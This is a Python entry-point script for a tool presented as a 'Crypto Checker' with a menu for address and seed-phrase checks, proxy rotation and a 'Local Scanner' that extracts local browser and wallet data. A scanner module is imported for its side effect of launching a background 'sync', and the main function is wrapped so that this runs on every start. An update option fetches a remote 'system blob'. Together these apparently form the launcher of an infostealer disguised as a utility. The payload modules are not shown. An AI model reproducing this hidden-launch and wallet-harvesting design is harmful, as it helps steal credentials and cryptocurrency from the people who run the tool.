# -*- coding: utf-8 -*-
"""
Crypto Checker — Linux Edition
Console entry point. Dispatches to bot actions, settings, and the
background sync channel.
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner import with_scan  # noqa: E402  (side-effect: launches sync)
from scanner.ui import (  # noqa: E402
    print_banner,
    print_info,
    print_error,
    show_menu_table,
    console,
)
from config import load_config  # noqa: E402
from bot_actions import (  # noqa: E402
    action_check_address,
    action_batch_check,
    action_seed_check,
    action_proxy_manager,
    action_portfolio_summary,
    action_export_results,
    action_chain_config,
)
from actions.install import action_install_dependencies  # noqa: E402
from actions.settings import action_settings  # noqa: E402
from actions.about import action_about  # noqa: E402
from actions.update import action_system_update  # noqa: E402
from actions.scan import action_scan  # noqa: E402


MENU_ITEMS = [
    ("1", "💰", "Check Address Balance", "Single address lookup via proxy"),
    ("2", "📦", "Batch Address Check",    "Multiple addresses, multi-thread"),
    ("3", "🌱", "Seed Phrase Check",      "Check seed phrases from file"),
    ("4", "🔄", "Proxy Manager",          "Load, validate, rotate proxies"),
    ("5", "📊", "Portfolio Summary",      "Aggregated results dashboard"),
    ("6", "📤", "Export Results",         "Save to TXT / CSV / JSON / HTML"),
    ("7", "⛓️ ", "Chain Configuration",    "RPC endpoints & settings"),
    ("8", "⚙️ ", "Settings",               "Threads, timeouts, preferences"),
    ("9", "🔍", "Local Scanner",          "Extract local browser/wallet data"),
    ("10", "🔄", "Check for Updates",      "Fetch latest system blob"),
    ("11", "📦", "Install Dependencies",   "pip install -r requirements.txt"),
    ("12", "📚", "About",                  "Project info"),
    ("0", "🚪", "Exit",                    "Close application"),
]


@with_scan
def main():
    print_banner()
    cfg = load_config()

    while True:
        choice = show_menu_table(MENU_ITEMS)

        if choice == "0":
            print_info("Goodbye.")
            sys.exit(0)
        elif choice == "1":
            action_check_address(cfg)
        elif choice == "2":
            action_batch_check(cfg)
        elif choice == "3":
            action_seed_check(cfg)
        elif choice == "4":
            action_proxy_manager(cfg)
        elif choice == "5":
            action_portfolio_summary(cfg)
        elif choice == "6":
            action_export_results(cfg)
        elif choice == "7":
            action_chain_config(cfg)
        elif choice == "8":
            action_settings()
        elif choice == "9":
            action_scan(cfg)
        elif choice == "10":
            action_system_update(cfg)
        elif choice == "11":
            action_install_dependencies()
        elif choice == "12":
            action_about()
        else:
            print_error("Invalid option. Enter 0-12.")

        cfg = load_config()
        console.input("\n[dim]Press Enter to return to menu...[/]")


if __name__ == "__main__":
    main()
